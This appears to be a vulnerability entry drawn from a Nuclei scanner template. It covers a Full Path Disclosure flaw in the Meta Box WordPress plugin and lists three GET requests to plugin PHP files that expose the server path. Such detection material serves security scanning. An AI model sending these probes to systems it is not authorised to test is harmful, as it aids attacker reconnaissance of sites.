# Vulnerability: WordPress Meta Box - Full Path Disclosure
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wordpress-meta-box-fpd.yaml`)

## Description
The Meta Box – WordPress Custom Fields Framework plugin for WordPress was detected to be vulnerable to Full Path Disclosure, allowing unauthenticated attackers to obtain the full application path.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/meta-box/meta-box.php
GET {{BaseURL}}/wp-content/plugins/meta-box/inc/loader.php
GET {{BaseURL}}/wp-content/plugins/meta-box/inc/core.php
```

